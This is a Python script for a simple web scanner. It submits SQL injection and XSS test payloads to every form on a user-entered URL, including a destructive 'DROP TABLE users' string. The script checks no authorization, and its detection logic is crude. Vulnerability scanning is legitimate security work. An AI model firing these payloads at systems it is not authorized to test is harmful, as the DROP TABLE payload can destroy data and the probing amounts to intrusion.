import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Test payloads
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "\" OR \"\" = \""]
xss_payloads = ["<script>alert('XSS')</script>", "\" onmouseover=alert(1) x=\""]

def get_forms(url):
    """Extract all forms from a webpage."""
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extract form details like action, method, and inputs."""
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": input_name})
    return details

def submit_form(form_details, url, value):
    """Submit a form with a payload."""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        else:
            data[input["name"]] = "test"

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss(url):
    print("\n[!] Scanning for XSS...")
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in xss_payloads:
            response = submit_form(details, url, payload)
            if payload in response.text:
                print(f"[+] XSS vulnerability detected with payload: {payload}")
                break

def scan_sql_injection(url):
    print("\n[!] Scanning for SQL Injection...")
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in sql_payloads:
            response = submit_form(details, url, payload)
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[+] SQL Injection vulnerability detected with payload: {payload}")
                break

if __name__ == "__main__":
    target_url = input("Enter target URL (with http/https): ").strip()

    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            scan_xss(target_url)
            scan_sql_injection(target_url)
        else:
            print("[-] Unable to reach the target URL.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
